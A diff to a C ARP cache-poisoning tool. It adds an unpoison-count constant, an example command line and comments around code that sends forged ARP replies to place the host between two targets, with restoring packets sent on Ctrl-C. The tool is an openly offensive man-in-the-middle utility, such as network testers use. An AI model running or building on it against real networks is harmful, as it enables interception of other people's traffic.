@@ -12,7 +12,12 @@
 #include "packet.h"
 #include "mutils.h"
 
+/* interval between sending the packets (in secons) */
 #define SLEEP_DELAY 1
+
+/* number of packets for each target that will be
+ * send after pressig ^C to unpoison the target */
+#define UNPOISON_COUNT 5
 
 int s; // socket
 struct arp_packet packet1_cl; // unpoisoning arp packet1
@@ -46,9 +51,9 @@ sendpacket(struct arp_packet * p)
 void
 cleanup()
 {
-  puts("Cleaning up and unpoisoning targets");
+  printf("Cleaning up and unpoisoning targets with %d packets.\n", UNPOISON_COUNT);
   int i = 0;
-  for(; i < 5; ++i) {
+  for(; i < UNPOISON_COUNT; ++i) {
     sendpacket(&packet1_cl);
     sendpacket(&packet2_cl);
     sleep(SLEEP_DELAY);
@@ -62,7 +67,9 @@ void
 showusage(int argc, char ** argv)
 {
   printf("Usage: %s <interface> <target1-ip> \
-<target1-mac> <target2-ip> <target2-mac>\n", argv[0]);
+<target1-mac> <target2-ip> <target2-mac>\n\
+Example: %s wlan0 192.168.1.1 \
+12:23:34:45:56:67 192.168.1.42 11:22:33:44:55:66", argv[0], argv[0]);
 
   exit(1);
 }
@@ -75,7 +82,7 @@ main(int argc, char ** argv)
 
   process_args(argc, argv);
 
-  // create arp packet
+  // create 2 poisoning packets and 2 unpoisoning packets
   struct arp_packet packet1 = create_arp_packet(ipa1, hwa1, ipa2, hwa_host);
   struct arp_packet packet2 = create_arp_packet(ipa2, hwa2, ipa1, hwa_host);
   packet1_cl = create_arp_packet(ipa1, hwa1, ipa2, hwa2);
@@ -83,13 +90,12 @@ main(int argc, char ** argv)
 
   // initialize socket
   s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-
   if (s < 0){
     perror("socket");
     exit(1);
   }
 
-  // some other stuff
+  // send unpoisoning packets after pressing ^C
   signal(SIGINT, cleanup);
 
   // start sending packets
